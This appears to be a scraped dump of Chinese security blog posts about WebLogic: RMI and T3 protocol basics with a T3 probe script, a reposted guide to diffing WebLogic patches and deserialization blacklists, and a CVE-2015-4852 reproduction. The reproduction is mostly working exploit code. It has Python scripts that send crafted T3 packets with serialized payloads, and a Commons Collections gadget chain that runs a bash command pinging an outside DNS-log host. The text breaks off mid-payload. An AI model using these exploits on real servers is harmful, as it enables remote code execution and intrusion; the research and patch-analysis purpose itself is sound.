12345678910111213141516171819202122232425262728293031// HelloImpl.javapackage examples.rmi.hello;import javax.naming.*;import java.rmi.RemoteException;public class HelloImpl implements IHello { private String name; public HelloImpl(String s) throws RemoteException { super(); name = s; } public String sayHello() throws java.rmi.RemoteException { return \"Hello World!\"; } public static void main(String args[]) throws Exception { try { HelloImpl obj = new HelloImpl(\"HelloServer\"); Context ctx = new InitialContext(); ctx.bind(\"HelloServer\", obj); System.out.println(\"HelloImpl created and bound in the registry \" + \"to the name HelloServer\"); } catch (Exception e) { System.err.println(\"HelloImpl.main: an exception occurred:\"); System.err.println(e.getMessage()); throw e; } }} WebLogic RMI的服务端已经构建完成，客户端也不再需要Stub对象： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// HelloClient.javapackage examples.rmi.hello;import java.util.Hashtable;import javax.naming.Context;import javax.naming.InitialContext;import javax.naming.NamingException;public class HelloClient { // Defines the JNDI context factory. public final static String JNDI_FACTORY = \"weblogic.jndi.WLInitialContextFactory\"; int port; String host; private static void usage() { System.err.println(\"Usage: java examples.rmi.hello.HelloClient \" + \"&lt;hostname&gt; &lt;port number&gt;\"); } public HelloClient() { } public static void main(String[] argv) throws Exception { if (argv.length &lt; 2) { usage(); return; } String host = argv[0]; int port = 0; try { port = Integer.parseInt(argv[1]); } catch (NumberFormatException nfe) { usage(); throw nfe; } try { InitialContext ic = getInitialContext(\"t3://\" + host + \":\" + port); IHello obj = (IHello) ic.lookup(\"HelloServer\"); System.out.println(\"Successfully connected to HelloServer on \" + host + \" at port \" + port + \": \" + obj.sayHello()); } catch (Exception ex) { System.err.println(\"An exception occurred: \" + ex.getMessage()); throw ex; } } private static InitialContext getInitialContext(String url) throws NamingException { Hashtable&lt;String, String&gt; env = new Hashtable&lt;String, String&gt;(); env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY); env.put(Context.PROVIDER_URL, url); return new InitialContext(env); }} 最后记得项目中引入wlthint3client.jar这个jar包供客户端调用时可以找到weblogic.jndi.WLInitialContextFactory。 来看一下WebLogic RMI的调用流程 前置知识讲完了，小结一下这些概念的关系，Java RMI即远程方法调用，默认使用JRMP协议通信。WebLogic RMI是WebLogic对Java RMI的实现，其使用T3或IIOP协议作为通信协议。无论是Java RMI还是WebLogic RMI，都需要使用JNDI去发现远端的RMI服务。 T3协议及反序列化漏洞T3协议简介WebLogic Server 中的 RMI 通信使用 T3 协议在 WebLogic Server 和其他 Java 程序（包括客户端及其他 WebLogic Server 实例）间传输数据。T3协议包括 请求包头 请求主体 因此，在T3数据包构造过程中，需要发送两部分的数据。 我们通过部署好的环境，以及现成的payload，去看看这个协议包情况 T3协议 12345t3 12.2.1AS:255HL:19MS:10000000PU:t3://us-l-breens:7001 可以看出这是它的请求头。本文测试时发送的T3协议头为 123456#第一行为“t3”加weblogic客户端的版本号。t3 12.2.1AS:255HL:19MS:10000000PU:t3://us-l-breens:7001 weblogic服务器的返回数据为 1234#第一行为“HELO:”加weblogic服务器的版本号HELO:10.3.6.0.falseAS:2048HL:19 weblogic客户端与服务器发送的数据均以“\\n\\n”结尾。 可能会问这个地方和其他地方的T3协议怎么不一样？因为我用的exp中，它是伪造自定义了请求包的。可参考文章。 也就是说，如何判断对方是否使用T3协议等等，可以对服务器进行发包，发送请求头，对方则会返回weblogic服务器版本前人经验：使用t3 9.2.0nAS:255nHL:19nn字符串作为T3的协议头发送给weblogic9、weblogic10g、weblogic11g、weblogic12c均合法。检测代码如下： 1234567891011121314import osimport socketimport timehello = b't3 10.3.6\\nAS:255\\nHL:19\\n\\n'sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)sock.settimeout(5)sock.connect(('192.168.22.137',7001))sock.send(hello)time.sleep(1)resp1 = sock.recv(1024)print(resp1) T3攻击方式 第一种：将weblogic发送的java序列化数据的地2到第7部分的反序列化数据进行替换 第二种：将weblogic发送的JAVA序列化数据的第一部分与恶意的序列化数据进行拼接。也就是替换第一部分的数据 以上来自网上文献：http://drops.xmd5.com/static/drops/web-13470.html T3反序列化漏洞上面，我详细解释了WebLogic RMI的调用过程，我们初窥了一下T3协议。那么现在我们来仔细看一下刚才抓到的正常WebLogic RMI调用时T3协议握手后的第一个数据包,有几点值得注意的是： 我们发现每个数据包里不止包含一个序列化魔术头（0xac 0xed 0x00 0x05） 每个序列化数据包前面都有相同的二进制串（0xfe 0x01 0x00 0x00） 每个数据包上面都包含了一个T3协议头 仔细看协议头部分，我们又发现数据包的前4个字节正好对应着数据包长度 以及我们也能发现包长度后面的“01”代表请求，“02”代表返回 这些点说明了T3协议由协议头包裹，且数据包中包含多个序列化的对象。那么我们就可以尝试构造恶意对象并封装到数据包中重新发送了。流程如下： 替换序列化对象示意图如下： 剩下的事情就是找到合适的利用链了（通常也是最难的事）。 参考文章 https://www.cnblogs.com/0x7e/p/14529949.html https://www.anquanke.com/post/id/219985#h2-10 https://nosec.org/home/detail/2859.html document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"技术基础","slug":"技术基础","permalink":"https://functfan.github.io/categories/%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"weblogic,T3,JNDI,RMI","slug":"weblogic-T3-JNDI-RMI","permalink":"https://functfan.github.io/tags/weblogic-T3-JNDI-RMI/"}]},{"title":"weblogic简介及补丁分析方法(转)","slug":"weblogic简介及补丁分析方法-转","date":"2021-06-22T02:31:07.000Z","updated":"2021-06-22T06:04:57.747Z","comments":true,"path":"posts/4114466392/","link":"","permalink":"https://functfan.github.io/posts/4114466392/","excerpt":"","text":"前言最近在对Weblogic进行研究，研究过程中需要对weblogic的基础知识有所了解，苦于自己懒又不愿意去查找官方文档以及各类参考文章去总结，为此在查阅了各类资料后，找到了几篇写的比较全的文章，可能是你能找到的最详细的WebLogic安全相关中文文档，由于文章介绍很详细，部分内容其实对自己的研究没什么影响，因此仅从中摘录了对于漏洞复现有关的内容，具体如下，如果有想查看原文的同学可以通过下方链接直达。不过介绍之前还是有必要声明该文章的来源及出处，防止侵权，在此也感谢各位前辈们在研究过程中付出的点点滴滴和共享的成果，让大家能够在研究的道路上摸清方向！ WebLogic安全研究报告引用文章说明 版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。 本文链接：https://nosec.org/home/detail/2859.html 来源：奇安信 本文版权归原作者所有，如有侵权请联系我及时删除 weblogic cve漏洞捡漏指南引用文章说明 版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。 本文链接：weblogic cve漏洞捡漏指南 来源：宽字节安全公众号 本文版权归原作者所有，如有侵权请联系我及时删除 Oracle WebLogic ServerOracle WebLogic Server（以下简称WebLogic）是一个可扩展的企业级Java平台（Java EE）应用服务器。其完整实现了Java EE 5.0规范，并且支持部署多种类型的分布式应用程序。 实际上WebLogic是组成Oracle融合中间件的核心。几乎所有的Oracle融合中间件产品都需要运行WebLogic Server。因此，本质上，WebLogic Server不是Oracle融合中间件，而是构建或运行Oracle融合中间件的基础，Oracle融合中间件和WebLogic密不可分，却在概念上不相等。 WebLogic的版本WebLogic版本众多，但是现在我们经常见到的只有两个类别：10.x和12.x，这两个大版本也叫WebLogic Server 11g和WebLogic Server 12c。根据Oracle官方下载页面https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html（从下向上看）： 10.x的版本为Oracle WebLogic Server 10.3.6，这个版本也是大家用来做漏洞分析的时候最喜欢拿来用的版本。P牛的vulhub(https://github.com/vulhub/vulhub)中所有WebLogic漏洞靶场都是根据这个版本搭建的。 12.x的主要版本有： Oracle WebLogic Server 12.1.3 Oracle WebLogic Server 12.2.1 Oracle WebLogic Server 12.2.1.1 Oracle WebLogic Server 12.2.1.2 Oracle WebLogic Server 12.2.1.3 Oracle WebLogic Server 12.2.1.4 值得注意的是，Oracle WebLogic Server 10.3.6支持的最低JDK版本为JDK1.6， Oracle WebLogic Server 12.1.3支持的最低JDK版本为JDK1.7，Oracle WebLogic Server 12.2.1及以上支持的最低JDK版本为JDK1.8。因此由于JDK的版本不同，尤其是反序列化漏洞的利用方式会略有不同。同时，不同的Oracle WebLogic Server版本依赖的组件(jar包)也不尽相同，因此不同的WebLogic版本在反序列化漏洞的利用上可能需要使用不同的Gadget链（反序列化漏洞的利用链条）。但这些技巧性的东西不是本文的重点，请参考其他文章。如果出现一些PoC在某些时候可以利用，某些时候利用不成功的情况，应考虑到这两点。 WebLogic的安装对于weblogic的安装，因为直接打包为了jar包文件，因此支持跨平台安装，既支持在windows上安装，也支持在linux下安装，windows的安装过程直接图形化界面安装即可，网上也有很多的参考资料，自行查阅相关资料即可安装；对于Linux操作系统，推荐使用WebLogic环境搭建工具，工具地址：https://github.com/QAX-A-Team/WeblogicEnvironment，也可参考我的博文 weblogic环境部署与远程调试 快速搭建和开启远程调试。 WebLogic漏洞分类WebLogic爆出的漏洞以反序列化为主，通常反序列化漏洞也最为严重，官方漏洞评分通常达到9.8。WebLogic反序列化漏洞又可以分为xmlDecoder反序列化漏洞和T3反序列化漏洞。其他漏洞诸如任意文件上传、XXE等等也时有出现。 WebLogic安全补丁WebLogic安全补丁通常发布在Oracle关键补丁程序更新、安全警报和公告 (https://www.oracle.com/technetwork/topics/security/alerts-086861.html) 页面中。其中分为关键补丁程序更新（CPU）和安全警报（Oracle Security Alert Advisory）。 关键补丁程序更新为Oracle每个季度初定期发布的更新，通常发布时间为每年1月、4月、7月和10月。安全警报通常为漏洞爆出但距离关键补丁程序更新发布时间较长，临时通过安全警报的方式发布补丁。 所有补丁的下载均需要Oracle客户支持识别码，也就是只有真正购买了Oracle的产品才能下载。 weblogic 补丁分析指南1.1 Opatch在你挖到漏洞后，最好安装weblogic的最新补丁来校验一下你的exp是否在最新补丁下生效。weblogic使用Opatch来管理补丁。在某些补丁中，补丁包对于Opatch最小版本是有要求，这时候我们需要升级Opatch补丁号为 [28186730: OPATCH 13.9.4.2.4 FOR FMW/WLS 12.2.1.3.0, 12.2.1.4.0 AND 14.1.1.0.0]来解决这个问题 https://support.oracle.com/epmos/faces/PatchHome?_adf.ctrl-state=1cdjuh74ay_4&amp;_afrLoop=92240149765348# 下载后，解压至任意文件夹 Windows 执行下面的命令 1java -jar opatch_generic.jar -J-Doracle.installer.oh_admin_acl=true -silent oracle_home=&lt;ORACLE_HOME_LOCATION&gt; 其它系统执行下面的命令 1java -jar &lt;PATCH_HOME&gt;/6880880/opatch_generic.jar -silent oracle_home=&lt;ORACLE_HOME_LOCATION&gt; 有不懂的，看压缩包里的Readme 1.2 Opatch 打补丁下载补丁后，解压至任意文件夹即可 在Oracle_home 安装目录中，找到Opatch文件夹，执行升级操作即可 Opatch apply 补丁解压的文件夹（注意是最内层文件夹) 1.3 下载补丁(需要CSI)我们只关心安全补丁，下面说下怎么下载补丁 登录Oracle support网站，找到Patchs&amp;Updates 栏目，点击进去 查询条件，自己根据需要构造即可 REC的补丁，并且被标记为security，且Generic Platform平台，即是补丁 注意，oracle每年发布四次安全补丁，安全补丁可以跨版本打，也就是说，老补丁同时也集成在新补丁中，这点一定注意。 weblogic 补丁分析方法weblogic中的补丁，其实是一个个编译好的class文件，我们直接使用idea打开补丁文件夹，就可以利用idea的反编译功能区分析补丁。 补丁中，每个class文件，都对应weblogic 实际目录中的一个class文件，打补丁你可以认为强行替换weblogic 中相关jar包中的class文件。 下面讲一下分析要点。对于这种安全补丁中，只有关于weblogic自身的安全问题，才会在这里体现，一般第三方包的安全漏洞，不会在该补丁中。 1.1 weblogic 黑名单直接看files\\oracle.wls.jrf.tenancy.common.sharedlib\\12.2.1.4.0\\wls.common.symbol\\modules\\com.bea.core.utils.jar\\weblogic\\utils\\io 文件夹下的WeblogicFilterConfig.class 文件 因为weblogic 的漏洞，绝大多数都是T3协议、IIOP协议的java反序列化漏洞。而weblogic为了修复该漏洞，最简单的办法是设置反序列化黑名单并添加黑名单列表。如果反序列化时遇到的类存在于黑名单中，则中止反序列化过程。 我们只需要diff黑名单列表，自己研究构造poc即可。有的时候不一定是rce，也有可能是其他问题。 1.2 其他反序列化类如果触发反序列化的类在正常业务中可能需要，或者因为其他原因不能屏蔽，weblogic的修复方法为直接修改相关的类。 如果一个类在readObject方法中，自己私自调用ObjectInputStream去执行反序列化操作而不是用weblogic提供的FilterInputStream执行反序列化操作，这样的话会导致weblogic的黑名单失效。这也就是反序列化中的反序列化漏洞，这种漏洞在weblogic中挺常见的。（不限于T3协议)我们diff中，可以明显发现weblogic的补丁将ObjectInputStream更改为FilterInputStream。在weblogic中，只有FilterInputStream才会在反序列化的流程中检查黑名单类。然后，我们根据这个类中的参数，自己构造一个类即可。在idea中，覆盖一个类最简单的办法是，在自己的项目中创建一个与被覆盖的类包名相同类名相同的类，然后修改你想要修改的代码即可。例如在这个反序列化中，我要修改writeExternal方法。直接强行替换成cve-2020-2555的gadget。 1.3 T3反序列化 XXE一般情况下该类漏洞都是在继承自Exterinalizable的类 中，在自定义序列过程时，将类的某些字段，作为XML去存储在反序列化的信息中。反序列化时候，读取序列化信息中相关的字符串作为XML去解析。解析的过程中没有考虑到XXE攻击。这次我捡漏的cve就是该类型的漏洞。 Java序列化、反序列化和反序列化漏洞的概念关于Java序列化、反序列化和反序列化漏洞的概念，可参考@gyyyy写的一遍非常详细的文章：《浅析Java序列化和反序列化》(https://github.com/gyyyy/footprint/blob/master/articles/2019/about-java-serialization-and-deserialization.md)。这篇文章对这些概念做了详细的阐述和分析。我这里只引用一段话来简要说明Java反序列化漏洞的成因： 当服务端允许接收远端数据进行反序列化时，客户端可以提供任意一个服务端存在的目标类的对象 （包括依赖包中的类的对象） 的序列化二进制串，由服务端反序列化成相应对象。如果该对象是由攻击者『精心构造』的恶意对象，而它自定义的readobject()中存在着一些『不安全』的逻辑，那么在对它反序列化时就有可能出现安全问题。 参考文章 https://nosec.org/home/detail/2859.html weblogic cve漏洞捡漏指南 (qq.com) https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&amp;mid=2247485058&amp;idx=1&amp;sn=d22b310acf703a32d938a7087c8e8704&amp;chksm=fe7a221ac90dab0cac2aaed6deebe7c56e316f767e2fb91e44e8e08aaa0a48790b4eefb447df&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1565607726135&amp;sharer_shareid=37947731a17f1281ace10f1fc77146cf&amp;key=e8e84aec0427272da90fdc17f4bdf02bb340c1eb7a12b95f91e0bd42a37b76b919e3b2d20fdbf79e4f262cbca90cb1e29a91ce86770010f67819219ef5c033a219db24ca7e87f72ed8786fa9ba946908&amp;ascene=1&amp;uin=MjMwMDM5OTYzMg%3D%3D&amp;devicetype=Windows+10&amp;version=62060833&amp;lang=zh_CN&amp;pass_ticket=l1uvYU9tgLWZe8D9eDAO27kX2BaRjKEi4OgpXzqLM1dXvVoo7n38b4y80UnpE3At document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"技术基础","slug":"技术基础","permalink":"https://functfan.github.io/categories/%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"weblogic,补丁分析,序列化与反序列化","slug":"weblogic-补丁分析-序列化与反序列化","permalink":"https://functfan.github.io/tags/weblogic-%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"CVE-2015-4852-Weblogic反序列化漏洞复现与分析","slug":"CVE-2015-4852-Weblogic反序列化漏洞复现与分析","date":"2021-06-16T07:57:02.000Z","updated":"2021-06-18T09:56:11.767Z","comments":true,"path":"posts/754158022/","link":"","permalink":"https://functfan.github.io/posts/754158022/","excerpt":"","text":"1.漏洞本质​ 该漏洞本质上是由Apache Commons Collections导致的反序列化漏洞，与weblogic实际无关，只是weblogic组件中正好用到了该库，且路径为\\modules\\com.bea.core.apache.commons.collections_3.2.0.jar。 2.漏洞描述 官方描述The WLS Security component in Oracle WebLogic Server 10.3.6.0, 12.1.2.0, 12.1.3.0, and 12.2.1.0 allows remote attackers to execute arbitrary commands via a crafted serialized Java object in T3 protocol traffic to TCP port 7001, related to oracle_common/modules/com.bea.core.apache.commons.collections.jar. NOTE: the scope of this CVE is limited to the WebLogic Server product. 对应中文Oracle WebLogic Server 10.3.6.0、12.1.2.0、12.1.3.0 和 12.2.1.0 中的 WLS 安全组件允许远程攻击者通过 T3 协议流量中精心设计的序列化 Java 对象执行任意命令，该对象与 oracle_common/modules/com.bea.core.apache.commons.collections.jar。注意：此 CVE 的范围仅限于 WebLogic Server 产品。 可知信息漏洞影响的版本为：Oracle WebLogic Server 10.3.6.0、12.1.2.0、12.1.3.0 和 12.2.1.0 漏洞类型为：反序列化漏洞 漏洞代码发生位置：oracle_common/modules/com.bea.core.apache.commons.collections.jar 3.漏洞复现漏洞exp漏洞exp一：(需配合ysoserial工具生成payload，具体命令见代码注释) 123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/env python# coding: utf-8import socketimport structdef exp(host, port): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) server_address = (host, int(port)) data = \"\" try: sock.connect(server_address) # Send headers headers = 't3 12.2.1nAS:255nHL:19nn'.format(port) sock.sendall(headers) data = sock.recv(2) # java -jar ysoserial.jar CommonsCollections1 \"touch /tmp/exp\" &gt; ./tmp f = open('./tmp', 'rb') payload_obj = f.read() f.close() payload1 = \"000005ba016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000\".decode('hex') payload3 = \"aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c00007870774b210000000000000000000d31302e3130312e3137302e3330000d31302e3130312e3137302e33300f0371a20000000700001b59ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c00007870771d01a621b7319cc536a1000a3137322e31392e302e32f7621bb50000000078\".decode('hex') payload2 = payload_obj payload = payload1 + payload2 + payload3 payload = struct.pack('&gt;I', len(payload)) + payload[4:] sock.send(payload) data = sock.recv(4096) except socket.error as e: print (u'socket 连接异常！') finally: sock.close()exp('192.168.22.137', 7001) 漏洞exp二：(Java代码生成payload,T3协议发送payload到目标服务器) 生成payload的代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;public class cve_2015_4852 { public static void main(String[] args) throws NoSuchMethodException, ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException { String cmd = \"ping xys3si.dnslog.cn\"; Transformer[] tarray = new Transformer[] { new ConstantTransformer( Runtime.class ), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String[].class}, new Object[]{new String[]{\"/bin/bash\", \"-c\", cmd}}) }; Transformer tchain = new ChainedTransformer( tarray ); Map normalMap = new HashMap(); Map lazyMap = LazyMap.decorate( normalMap, tchain ); Class clazz = Class.forName( \"sun.reflect.annotation.AnnotationInvocationHandler\" ); Constructor cons = clazz.getDeclaredConstructor( Class.class, Map.class ); cons.setAccessible( true ); InvocationHandler ih = ( InvocationHandler )cons.newInstance( Override.class, lazyMap ); Map mapProxy = ( Map ) Proxy.newProxyInstance ( Map.class.getClassLoader(), new Class[] { Map.class }, ih ); Object obj = cons.newInstance( Override.class, mapProxy ); FileOutputStream fileOutputStream = new FileOutputStream(\"CVE_2015_4852.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(obj); objectOutputStream.close(); }} 发送payload到目标服务器代码(有时候可能需要修改headers中的版本才能发送成功) 1234567891011121314151617181920212223242526272829303132333435363738#!/usr/bin/pythonimport socketimport osimport sysimport structif len(sys.argv) &lt; 3: print 'Usage: python %s &lt;host&gt; &lt;port&gt; &lt;/path/to/payload&gt;' % os.path.basename(sys.argv[0]) sys.exit()sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)sock.settimeout(5)server_address = (sys.argv[1], int(sys.argv[2]))print '[+] Connecting to %s port %s' % server_addresssock.connect(server_address)# Send headersheaders='t3 12.2.1\\nAS:255\\nHL:19\\nMS:10000000\\nPU:t3://us-l-breens:7001\\n\\n'print 'sending \"%s\"' % headerssock.sendall(headers)data = sock.recv(1024)print &gt;&gt;sys.stderr, 'received \"%s\"' % datapayloadObj = open(sys.argv[3],'rb').read()payload='\\x00\\x00\\x09\\xf3\\x01\\x65\\x01\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x71\\x00\\x00\\xea\\x60\\x00\\x00\\x00\\x18\\x43\\x2e\\xc6\\xa2\\xa6\\x39\\x85\\xb5\\xaf\\x7d\\x63\\xe6\\x43\\x83\\xf4\\x2a\\x6d\\x92\\xc9\\xe9\\xaf\\x0f\\x94\\x72\\x02\\x79\\x73\\x72\\x00\\x78\\x72\\x01\\x78\\x72\\x02\\x78\\x70\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x70\\x70\\x70\\x70\\x70\\x70\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x70\\x06\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x1d\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x43\\x6c\\x61\\x73\\x73\\x54\\x61\\x62\\x6c\\x65\\x45\\x6e\\x74\\x72\\x79\\x2f\\x52\\x65\\x81\\x57\\xf4\\xf9\\xed\\x0c\\x00\\x00\\x78\\x70\\x72\\x00\\x24\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x50\\x61\\x63\\x6b\\x61\\x67\\x65\\x49\\x6e\\x66\\x6f\\xe6\\xf7\\x23\\xe7\\xb8\\xae\\x1e\\xc9\\x02\\x00\\x09\\x49\\x00\\x05\\x6d\\x61\\x6a\\x6f\\x72\\x49\\x00\\x05\\x6d\\x69\\x6e\\x6f\\x72\\x49\\x00\\x0b\\x70\\x61\\x74\\x63\\x68\\x55\\x70\\x64\\x61\\x74\\x65\\x49\\x00\\x0c\\x72\\x6f\\x6c\\x6c\\x69\\x6e\\x67\\x50\\x61\\x74\\x63\\x68\\x49\\x00\\x0b\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x50\\x61\\x63\\x6b\\x5a\\x00\\x0e\\x74\\x65\\x6d\\x70\\x6f\\x72\\x61\\x72\\x79\\x50\\x61\\x74\\x63\\x68\\x4c\\x00\\x09\\x69\\x6d\\x70\\x6c\\x54\\x69\\x74\\x6c\\x65\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x4c\\x00\\x0a\\x69\\x6d\\x70\\x6c\\x56\\x65\\x6e\\x64\\x6f\\x72\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x0b\\x69\\x6d\\x70\\x6c\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x71\\x00\\x7e\\x00\\x03\\x78\\x70\\x77\\x02\\x00\\x00\\x78\\xfe\\x01\\x00\\x00'payload=payload+payloadObjpayload=payload+'\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x1d\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x43\\x6c\\x61\\x73\\x73\\x54\\x61\\x62\\x6c\\x65\\x45\\x6e\\x74\\x72\\x79\\x2f\\x52\\x65\\x81\\x57\\xf4\\xf9\\xed\\x0c\\x00\\x00\\x78\\x70\\x72\\x00\\x21\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x50\\x65\\x65\\x72\\x49\\x6e\\x66\\x6f\\x58\\x54\\x74\\xf3\\x9b\\xc9\\x08\\xf1\\x02\\x00\\x07\\x49\\x00\\x05\\x6d\\x61\\x6a\\x6f\\x72\\x49\\x00\\x05\\x6d\\x69\\x6e\\x6f\\x72\\x49\\x00\\x0b\\x70\\x61\\x74\\x63\\x68\\x55\\x70\\x64\\x61\\x74\\x65\\x49\\x00\\x0c\\x72\\x6f\\x6c\\x6c\\x69\\x6e\\x67\\x50\\x61\\x74\\x63\\x68\\x49\\x00\\x0b\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x50\\x61\\x63\\x6b\\x5a\\x00\\x0e\\x74\\x65\\x6d\\x70\\x6f\\x72\\x61\\x72\\x79\\x50\\x61\\x74\\x63\\x68\\x5b\\x00\\x08\\x70\\x61\\x63\\x6b\\x61\\x67\\x65\\x73\\x74\\x00\\x27\\x5b\\x4c\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2f\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2f\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2f\\x50\\x61\\x63\\x6b\\x61\\x67\\x65\\x49\\x6e\\x66\\x6f\\x3b\\x78\\x72\\x00\\x24\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x49\\x6e\\x66\\x6f\\x97\\x22\\x45\\x51\\x64\\x52\\x46\\x3e\\x02\\x00\\x03\\x5b\\x00\\x08\\x70\\x61\\x63\\x6b\\x61\\x67\\x65\\x73\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x0e\\x72\\x65\\x6c\\x65\\x61\\x73\\x65\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x5b\\x00\\x12\\x76\\x65\\x72\\x73\\x69\\x6f\\x6e\\x49\\x6e\\x66\\x6f\\x41\\x73\\x42\\x79\\x74\\x65\\x73\\x74\\x00\\x02\\x5b\\x42\\x78\\x72\\x00\\x24\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d